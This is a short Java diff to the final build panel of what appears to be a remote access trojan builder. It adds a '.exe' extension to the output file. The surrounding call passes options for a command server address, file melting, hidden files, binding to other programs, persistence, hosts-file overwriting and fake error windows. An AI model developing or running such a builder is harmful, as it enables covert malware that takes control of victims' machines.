@@ -242,6 +242,10 @@ public class PanelBuildFinal extends JPanel {
 
 						Build.build(new AdvancedBuildListener(frame), Files.getStub(), temp, ip, port, ID, pass, key, crypt, droppath, reconSec, name, fakewindow, faketitle, fakemessage, fakeicon, melt, hiddenFile, bind, bindpath, bindname, binddrop, usemutex, mutexport, plist, timeout, timeoutms, delay, delayms, usehost, hosttext, overwritehost, trayicon, icon, traymsg, traymsgfail, traytitle, handleerr, persistance, persistancems, debugmsg, osconfig, true);
 
+						if (!file.toLowerCase().endsWith(".exe")) {
+							file = file + ".exe";
+						}
+						
 						BuildExecutable.build(temp.getAbsolutePath(), file, out.frame);
 
 						temp.delete();
